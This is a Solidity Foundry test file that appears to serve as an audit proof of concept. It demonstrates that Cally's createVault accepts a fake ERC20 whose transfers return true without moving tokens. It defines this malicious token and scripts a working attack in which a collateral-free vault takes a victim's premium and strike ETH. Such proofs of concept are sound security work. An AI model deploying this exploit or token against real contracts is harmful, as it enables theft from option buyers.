// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/Cally.sol";

/*
    PoC Exploit for Cally createVault() missing-collateral vulnerability

    Vulnerability description (annotation 054):
    "Some ERC20 tokens don't throw but just return false when a transfer fails. This can be abused to trick
     the createVault() function to initialize the vault without providing any tokens. When such a vault is
     initialized, another user can both buy and exercise the option without ever receiving any funds. The
     creator of the vault does receive the buyer's Ether tho. So it can cause a loss of funds."

    Root cause:
    1. The vault is recorded in storage *before* the collateral transfer is executed.
    2. Cally relies on `SafeTransferLib.safeTransferFrom()` to move ERC20 collateral into the contract.
    3. `SafeTransferLib` only checks for
          - the low-level call succeeding, and
          - the return data being exactly `1` (`true`) **or** empty.
    4. A malicious ERC20 can therefore simply always return `true` without actually updating balances.
    5. Because there is no post-transfer balance check, the vault is left with **zero** collateral although it
       advertises a positive `tokenIdOrAmount`.
    6. Victims can still purchase the option and later exercise it – both ETH payments succeed – but they will
       never receive any tokens, resulting in a total loss while the vault creator captures the ETH.

    This test demonstrates the full attack path:
      1. A malicious ERC20 that lies about transfers is deployed.
      2. The attacker opens a vault that is supposed to hold 100 tokens **without owning any**.
      3. An honest user buys the option and exercises it, sending ETH, but receives zero tokens.
      4. The attacker is able to harvest the ETH even though no collateral was ever supplied.
*/

/// @dev ERC20 that *always* reports success but never changes any state.
contract MaliciousToken {
    string public name = "Phantom";
    string public symbol = "PHNTM";
    uint8  public decimals = 18;

    // --- ERC20 compatibility stubs ---------------------------------------------------------------
    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function allowance(address, address) external pure returns (uint256) { return 0; }
    function approve(address, uint256) external pure returns (bool) { return true; }

    // Pretend that the transfer succeeded – but do NOTHING.
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
}

contract ExploitTest is Test {
    Cally internal cally;
    MaliciousToken internal badToken;

    address internal attacker = address(0xA11CE);
    address internal victim   = address(0xB0B);

    function setUp() public {
        // Give the two EOAs some ETH for txs
        vm.deal(attacker, 100 ether);
        vm.deal(victim,   100 ether);

        // Deploy contracts
        cally     = new Cally();
        badToken  = new MaliciousToken();

        // Attacker "approves" Cally – approval always returns true, no state change necessary
        vm.prank(attacker);
        IERC20(address(badToken)).approve(address(cally), type(uint256).max);
    }

    function testCreateVaultWithoutCollateralAndStealETH() public {
        /*============================================================
                          1. Attacker creates vault
        ============================================================*/
        vm.startPrank(attacker);

        // Parameters: 100 phantom tokens, premiumIndex=0 (0.01 ETH), duration=1 day,
        // startingStrikeIndex=0 (1 ETH), reserveStrike=0.5 ETH, tokenType=ERC20.
        uint256 vaultId = cally.createVault(
            100 ether,
            address(badToken),
            0,
            1,
            0,
            0.5 ether,
            Cally.TokenType.ERC20
        );

        // Vault should exist even though attacker provided *zero* real tokens.
        Cally.Vault memory vaultInfo = cally.vaults(vaultId);
        assertEq(vaultInfo.token, address(badToken), "Vault token mismatch");

        vm.stopPrank();

        /*============================================================
                          2. Victim buys the option
        ============================================================*/
        // Move time forward so auction is active.
        vm.warp(block.timestamp + 1);

        uint256 optionId = vaultId + 1;
        uint256 premium  = cally.getPremium(vaultId); // == 0.01 ether

        vm.prank(victim);
        cally.buyOption{value: premium}(vaultId);

        // Victim now owns the option NFT.
        assertEq(cally.ownerOf(optionId), victim, "Victim should own option");

        /*============================================================
                          3. Victim exercises option
        ============================================================*/
        // Read strike that was set during buyOption
        vaultInfo = cally.vaults(vaultId);
        uint256 currentStrike = vaultInfo.currentStrike;
        assertGt(currentStrike, 0, "Strike not set");

        // Victim pays strike ETH to exercise
        vm.prank(victim);
        cally.exercise{value: currentStrike}(optionId);

        /*============================================================
                          4. Assertions – Victim lost, attacker gained
        ============================================================*/
        // Victim received ZERO tokens
        assertEq(IERC20(address(badToken)).balanceOf(victim), 0, "Victim unexpectedly received tokens");

        // Vault marked as exercised
        vaultInfo = cally.vaults(vaultId);
        assertTrue(vaultInfo.isExercised, "Vault not marked exercised");

        // Attacker is able to harvest both premium and strike ETH
        uint256 expectedRevenue = premium + currentStrike;
        uint256 attackerBalanceBefore = attacker.balance;

        vm.prank(attacker);
        cally.harvest();

        uint256 attackerBalanceAfter = attacker.balance;
        assertEq(attackerBalanceAfter - attackerBalanceBefore, expectedRevenue, "Attacker did not receive ETH");
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
